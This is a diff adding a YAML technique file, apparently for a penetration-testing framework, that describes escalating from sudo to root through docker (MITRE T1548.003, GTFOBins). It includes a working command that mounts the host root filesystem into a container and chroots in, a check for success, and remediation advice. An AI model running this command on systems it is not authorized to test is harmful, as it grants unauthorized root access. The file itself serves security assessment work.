@@ -1,0 +1,29 @@
+# Sudo → root via docker (GTFOBins)
+# Any writable-docker-socket / sudo-docker is a root primitive: mount host `/`
+# into an image and chroot in.
+technique: T1548.003
+name: Sudo → root via docker (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: docker
+execute:
+  command: 'sudo docker run -v /:/mnt --rm alpine chroot /mnt id'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `docker` gives arbitrary root code via the container
+    runtime — a mount of the host root into an image + chroot lands the
+    operator in the host filesystem as root.
+  remediation: >
+    Drop `docker` from sudoers. Docker socket membership is equivalent to
+    root and should be granted only to admins.
+  refs: [T1548.003, GTFOBins/docker]
